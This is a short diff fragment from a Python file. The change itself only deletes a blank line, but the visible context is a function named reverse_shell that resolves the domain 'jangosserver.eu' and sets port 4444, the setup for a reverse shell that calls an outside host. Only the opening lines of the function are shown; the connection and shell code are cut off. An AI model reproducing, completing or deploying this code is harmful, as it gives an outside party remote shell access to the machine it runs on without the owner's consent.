@@ -5,7 +5,6 @@ import os
 domain = "jangosserver.eu"
 PORT = 4444
 
-
 def reverse_shell():
     try:
         IP = socket.gethostbyname(domain)
